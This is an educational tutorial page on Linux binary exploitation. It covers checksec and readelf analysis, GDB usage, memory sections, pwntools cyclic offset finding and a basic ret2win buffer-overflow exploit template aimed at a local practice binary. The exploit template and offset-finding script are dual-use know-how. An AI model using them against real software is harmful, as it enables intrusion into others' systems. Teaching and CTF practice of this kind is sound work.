---
title: "Exploit Development"
topic: "exploit-development"
tags: [exploit-development, buffer-overflow, gdb, elf, checksec, pwntools, binary-exploitation]
difficulty: advanced
day: 42
layout: default
parent: Topics
nav_order: 42
---

# Exploit Development

## What You Will Learn
- How to analyze a binary's security protections
- How to perform static and dynamic analysis on a binary
- How to find buffer overflows and control the instruction pointer
- Key binary sections and memory layout concepts

## What Is It?

Exploit development is the process of finding and exploiting vulnerabilities in compiled programs. The goal is to take a bug (like a buffer overflow) and turn it into controlled code execution.

This topic covers the fundamental tools and techniques for binary exploitation on Linux.

## Why It Matters

Binary exploitation is at the core of:
- CTF pwn challenges
- Vulnerability research and CVE discovery
- Security assessments of compiled applications
- Malware and implant development

## Key Concepts

## Static Analysis

Static analysis examines a binary without running it.

```bash
# Display generic file information
file <binary>

# Check binary security mitigations
checksec <binary>

# Display information about ELF sections and symbols
readelf -a <binary>

# Decompile to Intel syntax assembly
objdump -M intel -d <binary>

# Show strings embedded in the binary
strings <binary>

# Show imported/exported symbols
nm <binary>
```

### Security Mitigations

`checksec` reports the security features of a binary:

| Mitigation | Description |
|-----------|-------------|
| **RELRO** | Prevents GOT overwrites |
| **Stack Canary** | Detects stack overflows |
| **NX / DEP** | Makes the stack non-executable |
| **PIE** | Position Independent Executable — ASLR for the binary |
| **ASLR** | Randomizes base addresses at runtime |

## Dynamic Analysis

Dynamic analysis examines a binary while it is running.

```bash
# Start GDB with a binary
gdb -q <binary>

# Disassemble a function
(gdb) disas <function>

# Set a breakpoint at a function
(gdb) b *<function>

# Run the program
(gdb) r

# Display registers
(gdb) info registers

# Display info about a specific register
(gdb) i r <register>

# Examine memory: 16 double-words (4 bytes each) as hex, starting at $esp
(gdb) x/16dx $esp
```

## Memory Layout

### Global Variables

- **`.data` section**: Contains initialized static data (e.g., `int x = 5;`)
- **`.bss` section**: Contains uninitialized static data
- **`.text` section**: Contains executable code

### File Offset vs Virtual Address

When analyzing a binary:
- **File offset**: Position of the byte within the file on disk
- **Virtual address**: Where the byte lives in memory when the program runs

These differ because the OS maps sections to specific memory addresses.

## Finding Buffer Overflows

```python
from pwn import *

# Generate a cyclic pattern to find the offset to RIP
pattern = cyclic(200)
p = process('./vuln')
p.sendline(pattern)
p.wait()

# Check what value is in RSP at crash time
core = p.corefile
offset = cyclic_find(core.rsp)
print(f"Offset to return address: {offset}")
```

## Basic Exploit Template

```python
from pwn import *

# Load binary
elf = ELF('./vuln')
p = process('./vuln')

offset = 64  # bytes to reach return address

# Build payload
payload  = b"A" * offset          # fill buffer
payload += p64(elf.sym['win'])     # overwrite return address with win()

p.sendline(payload)
p.interactive()
```

## Resources

- [pwn.college — Binary Exploitation](https://pwn.college/)
- [pwntools Documentation](https://docs.pwntools.com/)
- [LiveOverflow — Binary Exploitation Playlist](https://www.youtube.com/c/LiveOverflow)
- [CTF101 — Pwn Guide](https://ctf101.org/binary-exploitation/overview/)
- [Azeria Labs — ARM Exploit Development](https://azeria-labs.com/)
